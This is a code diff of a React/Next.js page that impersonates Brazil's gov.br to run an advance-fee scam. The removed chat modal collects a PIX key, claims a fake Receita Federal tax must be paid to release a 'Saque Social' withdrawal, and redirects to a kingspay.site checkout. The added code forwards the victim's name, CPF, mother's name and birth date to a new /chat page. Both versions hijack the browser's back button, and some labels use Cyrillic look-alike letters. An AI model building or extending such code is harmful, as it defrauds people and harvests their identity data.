@@ -34,13 +34,6 @@ interface Comment {
   id: string;
 }
 
-interface ChatMessage {
-  type: 'bot' | 'user' | 'typing';
-  text?: string;
-  id: string;
-}
-
-
 function OfferContent() {
   const router = useRouter();
   const searchParams = useSearchParams();
@@ -71,21 +64,14 @@ function OfferContent() {
   const [totalComments, setTotalComments] = useState(25738);
   const [loadingCommentsText, setLoadingCommentsText] = useState('');
   
-  const [isChatModalOpen, setIsChatModalOpen] = useState(false);
-  const [chatMessages, setChatMessages] = useState<ChatMessage[]>([]);
-  const [chatInputValue, setChatInputValue] = useState('');
-  const [chaveEnviada, setChaveEnviada] = useState(false);
-
-  const chatBodyRef = useRef<HTMLDivElement>(null);
 
   useEffect(() => {
-    const urlBackRedirect = '../back/index.html'; 
-    const trimmedUrlBackRedirect = urlBackRedirect.trim() +
-      (urlBackRedirect.includes("?") ? '&' : '?') +
-      (window.location.search ? window.location.search.replace('?', '') : '');
+    const urlBackRedirect = '/back/index.html'; // Assuming back/index.html is in public
+    const query = searchParams.toString();
+    const trimmedUrlBackRedirect = urlBackRedirect.trim() + (urlBackRedirect.includes("?") ? '&' : '?') + query;
 
-    history.pushState({}, "", location.href);
-    history.pushState({}, "", location.href);
+    history.pushState({}, "", window.location.href);
+    history.pushState({}, "", window.location.href);
 
     const handlePopState = () => {
       setTimeout(() => {
@@ -94,24 +80,20 @@ function OfferContent() {
     };
     window.addEventListener('popstate', handlePopState);
     return () => window.removeEventListener('popstate', handlePopState);
-  }, []);
+  }, [searchParams]);
   
   useEffect(() => {
     const storedState = localStorage.getItem('offerPageState');
     if (storedState) {
       try {
         const state = JSON.parse(storedState);
-        if (state.chaveEnviada) setChaveEnviada(state.chaveEnviada);
-        if (state.chatMessages) setChatMessages(state.chatMessages);
+        // Removed chat-specific state restoration
         if (state.videoStarted) setVideoStarted(state.videoStarted);
         if (state.videoCompleted) {
             setVideoCompleted(state.videoCompleted);
             finalizeProgressAppearance(); 
         }
         if (state.progressEnabled) setProgressEnabled(state.progressEnabled);
-        // If video had started but not completed, keep thumbnail overlay for unmuting
-        // setShowThumbnailOverlay is true by default, so no need to restore it to true here explicitly
-        // unless we specifically stored it as false and want to revert.
       } catch (e) {
         console.error("Failed to parse stored state:", e);
         localStorage.removeItem('offerPageState');
@@ -121,14 +103,12 @@ function OfferContent() {
 
   useEffect(() => {
     const stateToStore = {
-      chaveEnviada,
-      chatMessages: chatMessages.filter(msg => msg.type !== 'typing'), 
       videoStarted,
       videoCompleted,
       progressEnabled,
     };
     localStorage.setItem('offerPageState', JSON.stringify(stateToStore));
-  }, [chaveEnviada, chatMessages, videoStarted, videoCompleted, progressEnabled]);
+  }, [videoStarted, videoCompleted, progressEnabled]);
 
 
   const formatCPF = (cpf: string | undefined) => {
@@ -199,66 +179,18 @@ function OfferContent() {
   }, [initialCpf]);
   
   const handleSaqueButtonClick = () => {
-    setIsChatModalOpen(true);
-    if (chatMessages.length === 0 && !chaveEnviada) { 
-        startBotFlowInitial();
+    const currentParams = new URLSearchParams(searchParams.toString()); // Preserve existing params
+    
+    if (userData) {
+      currentParams.set('nome', formatFullName(userData.nome) || '');
+      currentParams.set('cpf', formatCPF(userData.cpf) || initialCpf || '');
+      currentParams.set('mae', formatFullName(userData.mae) || '');
+      currentParams.set('nascimento', formatDateBR(userData.nascimento) || '');
+    } else if (initialCpf) {
+      currentParams.set('cpf', formatCPF(initialCpf) || initialCpf);
     }
-  };
-
-  const scrollChatToBottom = () => {
-    if (chatBodyRef.current) {
-      chatBodyRef.current.scrollTop = chatBodyRef.current.scrollHeight;
-    }
-  };
-
-  useEffect(scrollChatToBottom, [chatMessages]);
-
-  const addBotMessage = async (text: string, delayMs = 1000) => {
-    setChatMessages(prev => [...prev, { type: 'typing', id: Date.now().toString() + 'typing' }]);
-    await new Promise(resolve => setTimeout(resolve, delayMs));
-    setChatMessages(prev => prev.filter(msg => msg.type !== 'typing'));
-    setChatMessages(prev => [...prev, { type: 'bot', text, id: Date.now().toString() }]);
-  };
-  
-  const addUserMessage = (text: string) => {
-    setChatMessages(prev => [...prev, { type: 'user', text, id: Date.now().toString() }]);
-  };
-
-  const startBotFlowInitial = async () => {
-    await addBotMessage('Olá! Para prosseguir com o seu saque, por favor, informe sua chave PIX.');
-  };
-  
-  const flowAfterPixKey = async () => {
-    await addBotMessage('Excelente! Sua <b>chave Pix</b> foi vinculada com sucesso.', 2200);
-    await addBotMessage('Observamos que o valor do seu saque supera <b>R$ 5.000</b>, segundo as diretrizes da Receita Federal.', 2500);
-    await addBotMessage('Para prosseguir e liberar de forma imediata, é obrigatório o recolhimento de <b>1.3%</b> sobre o valor total.', 2500);
-    await addBotMessage('<b>Valor do saque:</b> R$ 5.250,20<br><b>Imposto devido:</b> R$ 68,25<br>Depois do pagamento, o dinheiro cai na hora.', 2500);
-    await addBotMessage('Caso o valor do imposto não seja quitado, a Receita Federal destinará o valor do seu Saque Social para projetos e iniciativas de políticos do estado.', 2500);
-    await addBotMessage(`<b>Para finalizar o recebimento</b>, clique no botão abaixo:<br/><button class="pay-button" id="dynamic-pay-button">Pagar Imposto Agora</button>`, 0);
-  };
-
-  useEffect(() => {
-    const payButton = document.getElementById('dynamic-pay-button');
-    if (payButton) {
-      payButton.onclick = () => {
-        const paymentUrl = "https://kingspay.site/checkout/taxa-de-saque-2025"; 
-        window.location.href = paymentUrl;
-      };
-    }
-  }, [chatMessages]);
-
-
-  const handleSendMessage = async () => {
-    const text = chatInputValue.trim();
-    if (!text) return;
-
-    addUserMessage(text);
-    setChatInputValue('');
-
-    if (!chaveEnviada) {
-      setChaveEnviada(true);
-      await flowAfterPixKey();
-    }
+    
+    router.push(`/chat?${currentParams.toString()}`);
   };
   
   const handleThumbnailClick = async () => {
@@ -334,7 +266,7 @@ function OfferContent() {
         }
       };
     }
-  }, [videoCompleted, videoStarted, progressEnabled, playerRef.current]);
+  }, [videoCompleted, videoStarted, progressEnabled, playerRef.current]); // playerRef.current added
 
 
   useEffect(() => {
@@ -382,7 +314,7 @@ function OfferContent() {
     }, 10000); 
 
     return () => clearInterval(commentInterval);
-  }, []); 
+  }, []); // Removed comments from dependency array
 
 
   const plyrSource = useMemo(() => ({
@@ -538,51 +470,7 @@ function OfferContent() {
 
         <footer className="offer-page-footer">Теrmоs dе Usо dе Аvisо dе Рrivасidаdе</footer>
 
-        {isChatModalOpen && (
-          <div id="modal-chat" className="active">
-            <div className="chat-bot-container">
-              <div className="chat-header">
-                <span className="chat-header-title">Аtеndimеntо Virtuаl</span>
-                <button className="close-btn" onClick={() => setIsChatModalOpen(false)}><X /></button>
-              </div>
-              <div className="chat-body" ref={chatBodyRef}>
-                {chatMessages.map(msg => {
-                  if (msg.type === 'typing') {
-                    return (
-                      <div key={msg.id} className="typing-indicator-container message-bot-container">
-                        <Image className="bot-avatar" src="https://sso.acesso.gov.br/assets/govbr/img/govbr.png" alt="Bot" width={24} height={24} data-ai-hint="government logo"/>
-                        <div className="message-bot typing-indicator-bubble">
-                          <div className="blue-circle"></div><div className="blue-circle"></div><div className="blue-circle"></div>
-                        </div>
-                      </div>
-                    );
-                  }
-                  return msg.type === 'bot' ? (
-                    <div key={msg.id} className="message-bot-container">
-                       <Image className="bot-avatar" src="https://sso.acesso.gov.br/assets/govbr/img/govbr.png" alt="Bot" width={24} height={24} data-ai-hint="government logo"/>
-                      <div className="message-bot" dangerouslySetInnerHTML={{ __html: msg.text || ''}}></div>
-                    </div>
-                  ) : (
-                    <div key={msg.id} className="message-user-container">
-                      <div className="message-user">{msg.text}</div>
-                    </div>
-                  );
-                })}
-              </div>
-              <div className="chat-footer">
-                <input 
-                  type="text" 
-                  id="user-input" 
-                  placeholder="Digite sua chave pix..." 
-                  value={chatInputValue}
-                  onChange={(e) => setChatInputValue(e.target.value)}
-                  onKeyPress={(e) => e.key === 'Enter' && handleSendMessage()}
-                />
-                <button id="send-message" onClick={handleSendMessage}>Еnviаr</button>
-              </div>
-            </div>
-          </div>
-        )}
+        {/* Old chat modal removed from here, as it's being replaced by the new /chat page */}
       </div>
     </>
   );
@@ -605,4 +493,3 @@ export default function OfferPage() {
     </Suspense>
   );
 }
-
